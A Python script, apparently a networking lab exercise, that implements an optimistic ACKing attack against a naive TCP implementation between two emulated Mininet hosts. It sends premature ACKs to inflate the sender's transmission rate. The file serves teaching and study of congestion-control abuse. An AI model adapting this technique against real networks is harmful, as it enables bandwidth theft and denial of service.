from naive_tcp import *

class Optimistic_ACKing_Attacker(TCP_Client):
    def __init__(self, ack_interval, host):
        self.received_packets = deque()
        self.ack_interval = ack_interval
        self.cur_ack_no = 1
        self.last_ack_time = None

        if host == 'h1':
            self.src_ip = H1_ADDR
            self.dst_ip = H2_ADDR
            self.src_port = H1_PORT
            self.dst_port = H2_PORT
            
        if host == 'h2':
            self.src_ip = H2_ADDR
            self.dst_ip = H1_ADDR
            self.src_port = H2_PORT
            self.dst_port = H1_PORT

    def time_miliseconds(self):
        return int(round(time.time() * 1000))

    def send_optimistic_ack(self):
        if self.time_miliseconds() - self.last_ack_time > self.ack_interval:
            self.cur_ack_no += MSS
            self.send_ack(self.cur_ack_no)

    def start_attack(self):
        # Start sending optimistic ACKs after hearing the first data segment
        while True:
            if len(self.received_packets) != 0:
                break
        self.last_ack_time = self.time_miliseconds()
        while True:
            self.send_optimistic_ack()

    def start(self):
        listen_t = threading.Thread(target=self.listen)
        listen_t.start()
        self.start_attack()

if __name__ == "__main__":
    def check_ack_interval(val):
        ival = int(val)
        if ival < 10 or ival > 50:
            raise argparse.ArgumentTypeError("%s is an invalid ACK interval (range: 10ms - 50ms)" % val)
        return ival

    parser = argparse.ArgumentParser(description="Optimistic ACKing attacker.")
    parser.add_argument('--ack-interval', dest='ack_interval',
                        required=True, type=check_ack_interval,
                        help="Time inteval between sending optimistic ACKs in miliseconds.")
    parser.add_argument('--host', dest='host',
                        required=True,
                        help="Mininet host (`h1` or `h2`)")

    args = parser.parse_args()
    attacker = Optimistic_ACKing_Attacker(args.ack_interval, args.host)
    attacker.start()
